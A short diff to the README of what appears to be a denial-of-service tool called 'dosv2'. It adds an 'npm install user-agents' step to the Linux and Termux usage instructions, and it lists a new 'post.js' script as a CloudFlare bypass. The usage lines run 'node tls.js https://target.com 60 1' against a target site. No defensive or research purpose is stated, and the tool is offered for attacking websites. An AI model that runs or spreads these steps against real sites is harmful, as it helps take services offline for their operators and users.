@@ -20,6 +20,7 @@ Usage LINUX OR Ubuntu
     $ cd dosv2
     $ apt install nodejs -y
     $ unzip node_modules.zip
+    $ npm install user-agents
     $ node tls.js https://target.com 60 1
 
 
@@ -32,6 +33,7 @@ Usage TERMUX
     $ cd dosv2
     $ pkg install nodejs -y
     $ unzip node_modules.zip
+    $ npm install user-agents
     $ node tls.js https://target.com 60 1
 
 
@@ -40,6 +42,7 @@ Updating
 
     # tls.js
     # cf.js BAYPASS CloudFlare
+    # post.js BAYPASS CloudFlare
     
 
 
